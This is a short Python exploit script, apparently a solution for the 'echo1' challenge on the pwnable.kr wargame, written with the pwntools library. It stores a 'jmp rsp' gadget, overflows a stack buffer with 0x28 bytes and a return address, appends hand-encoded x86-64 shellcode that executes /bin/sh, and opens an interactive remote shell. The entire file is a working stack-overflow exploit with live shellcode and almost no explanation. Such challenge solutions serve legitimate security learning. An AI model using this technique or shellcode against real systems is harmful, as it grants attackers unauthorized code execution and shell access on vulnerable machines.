#Exploit for echo1@pwnable.kr
#@Windcarp 2015.07.23
from pwn import *
#init
context(arch = 'amd64', os = 'linux')
local=False
if local:
    p = process("./echo1")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
else:
    p = remote("pwnable.kr", 9010)
binary = ELF("echo1")
raw_input()
#address
len_to_ret = 0x28
ret_addr_str = p64(0x6020a0)
jmpesp_str = asm('jmp rsp')
#payload
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"
payload = 'a'*len_to_ret
payload += ret_addr_str
payload += buf
print repr(payload)
#first step
#attention to fit the program well
print repr(p.recvuntil(':'))
p.send(jmpesp_str + '\n')
print repr(p.recvuntil('>'))
p.send('1' + '\n')
print repr(p.recvuntil('\n'))
p.send(payload + '\n')
print repr(p.recvuntil('\n'))
#yeah!We got the shell!
p.interactive()